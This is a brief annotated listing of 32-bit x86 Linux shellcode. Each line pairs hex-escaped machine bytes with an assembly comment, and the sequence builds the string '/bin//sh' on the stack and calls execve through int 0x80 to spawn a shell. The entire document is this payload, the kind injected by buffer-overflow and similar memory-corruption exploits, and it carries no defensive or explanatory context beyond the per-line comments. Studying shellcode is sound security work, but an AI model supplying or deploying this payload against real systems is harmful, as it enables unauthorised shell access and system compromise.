\x31\xf6\x31\xff\x31\xc9\x31\xd2      # xor esi, esi; xor edi, edi; xor ecx, ecx; xor edx, edx;
\x52                                  # push edx
\x68\x2f\x2f\x73\x68                  # push 0x68732f2f  (//sh)
\x68\x2f\x62\x69\x6e                  # push 0x6e69622f  (/bin)
\x89\xe3                              # mov ebx, esp     (ebx = "/bin//sh")
\x31\xc0                              # xor eax, eax     (eax = 0)
\xb0\x0b                              # mov al, 0xb      (eax = 11, sys_execve)
\xcd\x80                              # int 0x80         (trigger interrupt to make the system call)